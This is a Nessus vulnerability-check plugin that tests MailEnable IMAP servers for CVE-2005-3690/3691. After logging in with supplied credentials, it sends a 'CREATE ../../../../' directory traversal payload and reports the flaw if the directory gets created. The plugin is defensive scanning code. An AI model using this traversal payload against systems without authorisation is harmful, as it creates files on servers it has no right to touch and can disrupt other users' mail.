#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote IMAP server is affected by buffer overflow and directory
traversal vulnerabilities. 

Description :

The remote host is running MailEnable, a commercial mail server for
Windows. 

The IMAP server bundled with the version of MailEnable Professional or
Enterprise Edition installed on the remote host is prone to a
stack-based buffer overflow when handling an overly-long mailbox name
in certain commands.  An authenticated attacker may be able to
leverage this issue to execute arbitrary code remotely as the SYSTEM
user. 

It also fails to filter directory traversal sequences from mailbox
names passed to the 'CREATE' and 'RENAME' commands.  An authenticated
attacker can exploit these issues to create arbitrary directories on
the affected host and to cause a denial of service by renaming the
mail directories of other users. 

See also : 

http://secunia.com/secunia_research/2005-59/advisory/
http://www.mailenable.com/hotfix/

Solution : 

Upgrade to MailEnable Professional 1.7 or later.  Or apply ME-100008,
the IMAP Cumulative Hotfix dated November 18th, 2005, referenced in
the vendor URL above. 

Risk factor : 

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";


if (description) {
  script_id(20226);
  script_version("$Revision: 1.5 $");

  script_cve_id("CVE-2005-3690", "CVE-2005-3691");
  script_bugtraq_id(15492, 15494);
  script_xref(name:"OSVDB", value:"20929");

  script_name(english:"MailEnable IMAP Server Buffer Overflow and Directory Traversal Vulnerabilities");
  script_summary(english:"Checks for buffer overflow and directory traversal vulnerabilities in MailEnable IMAP server");

  script_description(english:desc);
 
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"Gain root remotely");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencie("imap_overflow.nasl");
  script_require_keys("imap/login", "imap/password");
  script_exclude_keys("imap/false_imap", "imap/overflow");
  script_require_ports("Services/imap", 143);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");


port = get_kb_item("Services/imap");
if (!port) port = 143;
if (!get_port_state(port) || get_kb_item("imap/false_imap")) exit(0);


user = get_kb_item("imap/login");
pass = get_kb_item("imap/password");
if (!user || !pass) {
  if (log_verbosity > 1) debug_print("imap/login and/or imap/password are empty; skipped!", level:0);
  exit(0);
}


# Establish a connection.
tag = 0;
soc = open_sock_tcp(port);
if (!soc) exit(0);


# Read banner and make sure it looks like MailEnable's.
s = recv_line(socket:soc, length:1024);
if (
  !strlen(s) || 
  "IMAP4rev1 server ready at" >!< s
) {
  close(soc);
  exit(0);
}


# Try to log in.
++tag;
resp = NULL;
c = string("nessus", string(tag), " LOGIN ", user, " ", pass);
send(socket:soc, data:string(c, "\r\n"));
while (s = recv_line(socket:soc, length:1024)) {
  s = chomp(s);
  m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
  if (!isnull(m)) {
    resp = m[1];
    break;
  }
}


# If successful, try to exploit the flaw.
if (resp && resp =~ "OK") {
  ++tag;
  resp = NULL;
  # nb: this creates a random directory in MailEnable's installation directory.
  mailbox = string(SCRIPT_NAME, "_", rand_str());
  c = string("nessus", string(tag), " CREATE ../../../../", mailbox);
  send(socket:soc, data:string(c, "\r\n"));
  while (s = recv_line(socket:soc, length:1024)) {
    s = chomp(s);
    m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
    if (!isnull(m)) {
      resp = m[1];
      break;
    }
  }

  # There's a problem if we were successful; ie,
  # "nessus2 OK CREATE completed" vs "nessus2 BAD Invalid parameters".
  if (resp && resp =~ "OK" && "CREATE completed" >< s) {
    if (report_verbosity > 0) {
      report = string(
        desc,
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Nessus was able to create the following directory on the remote\n",
        "host, under the directory in which MailEnable is installed:\n",
        "\n",
        mailbox
      );
    }
    else report = desc;

    security_warning(port:port, data:report);
  }
}
else if (resp =~ "NO") {
  if (log_verbosity > 1) debug_print("couldn't login with supplied imap credentials!", level:0);
}


# Logout.
++tag;
resp = NULL;
c = string("nessus", string(tag), " LOGOUT");
send(socket:soc, data:string(c, "\r\n"));
while (s = recv_line(socket:soc, length:1024)) {
  s = chomp(s);
  m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
  if (!isnull(m)) {
    resp = m[1];
    break;
  }
}
close(soc);
